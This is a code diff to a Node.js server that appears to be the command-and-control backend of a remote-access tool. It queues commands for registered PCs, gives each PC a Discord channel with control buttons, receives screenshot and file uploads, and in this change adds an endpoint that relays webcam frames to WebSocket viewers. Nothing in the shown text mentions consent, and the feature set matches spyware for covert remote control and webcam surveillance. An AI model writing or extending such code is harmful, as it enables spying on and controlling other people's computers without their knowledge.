@@ -18,10 +18,10 @@ const CATEGORY_NAME = "Все ПК";
 const ONLINE_TIMEOUT = 3 * 60 * 1000; // 3 минуты
 
 // ---------- Состояние ----------
-const onlinePCs = {};          // pcId -> timestamp
-const pendingCommands = {};    // pcId -> array of commands
-const channelByPC = {};        // pcId -> channelId
-const wsClients = {};          // pcId -> array of ws
+const onlinePCs = {};           // pcId -> timestamp
+const pendingCommands = {};     // pcId -> array of commands
+const channelByPC = {};         // pcId -> channelId
+const wsClients = {};           // pcId -> array of ws
 const messagesWithButtons = {}; // pcId -> messageId
 
 // ---------- Discord Bot ----------
@@ -102,21 +102,14 @@ app.post("/upload", async (req, res) => {
         if(files.length) await finalChannel.send({ files });
 
         // ---------- Кнопки ----------
-        // Удаляем старое сообщение с кнопками
         if(messagesWithButtons[pcId]){
             try {
                 const oldMsg = await finalChannel.messages.fetch(messagesWithButtons[pcId]);
                 if(oldMsg) await oldMsg.delete();
             } catch(e){}
         }
-        // Создаём новое сообщение с кнопками
         const newMsg = await finalChannel.send({ content: `Управление ПК ${pcId}`, components: createControlButtons(pcId) });
         messagesWithButtons[pcId] = newMsg.id;
-
-        // ---------- Отправка скриншота через WS ----------
-        if(screenshot && wsClients[pcId]){
-            wsClients[pcId].forEach(ws => ws.send(screenshot));
-        }
 
         res.json({ success:true });
     } catch(err){
@@ -134,6 +127,20 @@ app.post("/ping", (req, res) => {
     const commands = pendingCommands[pcId] || [];
     pendingCommands[pcId] = [];
     res.json({ commands });
+});
+
+// ---------- Приём кадров с камеры ----------
+app.post("/upload_cam", (req, res) => {
+    const { pcId, screenshot } = req.body;
+    if(!pcId || !screenshot) return res.status(400).json({ error:"pcId and screenshot required" });
+
+    // Отправка всем подключённым клиентам WS
+    if(wsClients[pcId]){
+        wsClients[pcId].forEach(ws => {
+            if(ws.readyState === ws.OPEN) ws.send(screenshot);
+        });
+    }
+    res.json({ success:true });
 });
 
 // ---------- Статика ----------
